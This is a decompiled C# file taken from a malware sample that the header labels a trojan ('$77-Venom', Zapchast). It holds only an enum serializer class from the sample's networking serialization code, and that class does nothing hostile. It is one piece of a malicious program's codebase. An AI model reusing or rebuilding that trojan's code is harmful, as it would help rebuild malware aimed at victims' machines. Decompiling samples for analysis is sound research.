// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.TypeSerializers.EnumSerializer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.Reflection;

namespace xClient.Core.NetSerializer.TypeSerializers
{
  public class EnumSerializer : IStaticTypeSerializer, ITypeSerializer
  {
    public bool Handles(Type type) => type.IsEnum;

    public IEnumerable<Type> GetSubtypes(Type type)
    {
      yield return Enum.GetUnderlyingType(type);
    }

    public void GetStaticMethods(Type type, out MethodInfo writer, out MethodInfo reader)
    {
      Type underlyingType = Enum.GetUnderlyingType(type);
      writer = Primitives.GetWritePrimitive(underlyingType);
      reader = Primitives.GetReaderPrimitive(underlyingType);
    }
  }
}
